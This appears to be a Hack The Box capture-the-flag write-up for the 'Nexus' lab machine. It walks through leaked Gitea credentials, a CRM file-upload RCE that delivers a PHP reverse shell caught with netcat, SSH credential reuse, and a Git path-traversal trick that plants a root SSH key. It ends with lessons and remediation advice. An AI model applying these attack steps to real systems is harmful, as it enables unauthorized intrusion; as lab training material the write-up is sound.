# Nexus — HTB Easy

**Difficulty:** Easy
**OS:** Linux
**Path:** Easy

## Summary

Nexus chains several misconfigurations across a Krayin CRM deployment: an exposed Gitea repository leaking database credentials via `.env`, an authenticated RCE in Krayin's TinyMCE media upload endpoint (CVE-2026-38526) used to gain a foothold as `www-data`, SSH access as `jones` via reused/leaked credentials, and a privilege escalation to root via a Gitea template-sync script vulnerable to path traversal.

## Recon

```
nmap -sC -sV -T4 -p- <TARGET_IP>
```

Identified an HTTP service running a "Security Dashboard" front-end on gunicorn (Python-backed), suggesting subdomains/vhosts were worth enumerating rather than treating the base site as the full attack surface.

## Enumeration

**Vhost fuzzing**, since the base site offered no further leads:

```
ffuf -H "Host: FUZZ.nexus.htb" -u http://<TARGET_IP> -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs <baseline_size>
```

Discovered two relevant subdomains: `git.nexus.htb` and `billing.nexus.htb`. Added both to `/etc/hosts`.

**Git server (`git.nexus.htb`)** — a Gitea instance. Browsing available repositories revealed `krayin-docker-setup`, containing an exposed `.env` file with live database credentials:

```
DB_USERNAME=krayin
DB_PASSWORD=<redacted>
```

The repository's `docker-compose.yml` confirmed the app was a `webkul/krayin` (Krayin CRM) deployment, though it referenced the image by tag only, not a pinned version. Checking commit history on the repo surfaced an earlier commit containing an additional, different plaintext password later reused for SSH access.

**Billing app (`billing.nexus.htb`)** — the live Krayin CRM instance, at `/admin/login`. Laravel Debugbar was enabled and exposed in the page source, leaking the Laravel framework version (12.54.1) and extensive internal request/session data, itself a significant information disclosure issue, though not the primary path in.

## Exploitation

Krayin CRM's `/admin/tinymce/upload` endpoint was identified as vulnerable to **CVE-2026-38526**, an authenticated RCE (CVSS 9.9) allowing arbitrary PHP file upload via the TinyMCE media upload feature.

Using credentials recovered from the Gitea commit history (`j.matthew@nexus.htb`), authenticated against the Krayin login and used a public exploit script targeting this CVE to upload a PHP reverse shell payload to the TinyMCE upload endpoint:

```
python3 exploit.py -t http://billing.nexus.htb -u 'j.matthew@nexus.htb' -p '<redacted>' -f /usr/share/webshells/php/php-reverse-shell.php
```

The script returned the uploaded file's live path under `/storage/tinymce/`. Started a listener:

```
nc -lvnp 4444
```

Triggered the payload by requesting the uploaded file's URL directly, catching a shell as `www-data`.

**Root cause:** the TinyMCE upload endpoint failed to properly validate/restrict uploaded file types, allowing a `.php` file to be placed in a web-accessible directory and executed directly by the server.

## Privilege Escalation (to `jones`)

From the `www-data` shell, enumerated the live Krayin application directory and found the deployed `.env` file with database credentials. Checked `/etc/passwd` for local users and found `jones` present with a valid shell.

Using a leaked plaintext credential recovered earlier from the Gitea commit history, authenticated via SSH as `jones`:

```
ssh jones@<TARGET_IP>
```

Captured the user flag at `/home/jones/user.txt`.

**Root cause:** credential reuse, a password committed to git history (later removed from the current commit but still present in history) remained valid and was reused for a real system account's SSH login.

## Privilege Escalation (to `root`)

Enumerated scheduled tasks as `jones`:

```
systemctl list-timers
```

Identified `gitea-template-sync.timer`, running every ~2 minutes and triggering `gitea-template-sync.service`.

Read the associated script at `/etc/gitea/template-sync.py`. The script clones repositories marked as Gitea "template" repos and syncs their file contents into `/home/git/template-staging/<owner>/<repo>/`, using:

```python
target = os.path.join(stage_path, filepath)
os.makedirs(os.path.dirname(target), exist_ok=True)
```

`filepath` is taken directly from `git ls-tree` output with no sanitization. Since `os.path.join()` resolves `..` sequences, a maliciously crafted git tree containing `..`-traversal path components would allow writing files outside the intended staging directory, anywhere the `git` user has filesystem access, including `/root/`.

Git's standard commands (`git add`, `git commit`) refuse to create paths containing `..` (enforced by Git's internal `verify_path()` check). To bypass this, raw Git objects (blobs, trees, commits) were constructed directly and written into `.git/objects/`, sidestepping Git's path validation entirely since it only applies at the porcelain command layer, not the underlying object format.

**Steps taken:**

1. Generated a local SSH key pair for later root access:
   ```
   ssh-keygen -t ed25519 -f /tmp/.k -N ''
   ```

2. Created a new Gitea repository (`rce`) owned by `jones`, and marked it as a **template repository** so it would be picked up by the sync script.

3. Cloned the repo locally and used a custom script to hand-construct Git objects: a blob containing the attacker's SSH public key, nested inside nested `..`-named tree entries, calculated to traverse exactly 5 levels up from the staging path (`/home/git/template-staging/jones/rce/`) to reach `/root/`, landing the payload at `/root/.ssh/authorized_keys`.

4. Force-pushed the crafted commit as the new tip of `main`:
   ```
   git push -u origin main --force
   ```

5. Waited for the sync timer to fire (up to ~2 minutes) and confirmed via `/var/log/template-sync.log` that the traversal path was processed:
   ```
   synced: ../../../../../root/.ssh/authorized_keys
   ```

6. SSH'd in as root using the planted key:
   ```
   ssh -i /tmp/.k root@<TARGET_IP>
   ```

Captured the root flag at `/root/root.txt`.

**Root cause:** the sync script trusted file paths returned by `git ls-tree` without validating or rejecting `..` traversal sequences before joining them to the staging directory path, combined with Gitea allowing any user to mark their own repository as a "template" that the privileged sync service would automatically process.

## Flags

User and root flags captured (redacted for this writeup).

## Lessons Learned

- Exposed `.env` files (via misconfigured git hosting or web server misconfig) are a recurring, high-value find, always check git history too, not just the current file state, since removed secrets often persist in earlier commits.
- Credential reuse across services (DB password / SSH password / git-committed password) is one of the most common realistic attack paths, always test recovered credentials broadly, not just against the service they were found in.
- Debug tooling left enabled in what should be a production-like environment (Laravel Debugbar, `APP_DEBUG=true`) leaks substantial internal information even without directly enabling an exploit, worth flagging on its own in a real assessment.
- File upload endpoints need strict server-side validation of file type/extension, client-side or extension-swap-based restrictions (as exploited via Burp Suite request interception in the reference approach) are trivially bypassed.
- Path traversal vulnerabilities aren't limited to web request parameters, this box demonstrates the same vulnerability class occurring in a backend automation script processing data from a version control system.
- Understanding Git's internal object model (blobs, trees, commits, and the plumbing commands that manipulate them directly) is what made this specific exploit possible, higher-level Git commands enforce safety checks that don't exist at the raw object storage layer.

## Remediation (real-world)

- Never commit secrets to version control, even briefly, rotate any credential that has touched git history, removing it from the latest commit does not remove it from history.
- Enforce strict allow-listed file type validation server-side on any upload endpoint, independent of client-supplied filenames or extensions, and store uploads outside the web root or with execution disabled.
- Disable debug tooling (Debugbar, `APP_DEBUG`) in any environment reachable outside a trusted development context.
- Enforce unique, non-reused credentials across all services and accounts.
- Sanitize any file path derived from external or attacker-influenceable input (including version-control-sourced data) before using it in filesystem operations; reject or strip `..` sequences explicitly rather than trusting `os.path.join()` alone to produce a safe result.
- Restrict which users can create "template" repositories if that designation triggers privileged automated processing.
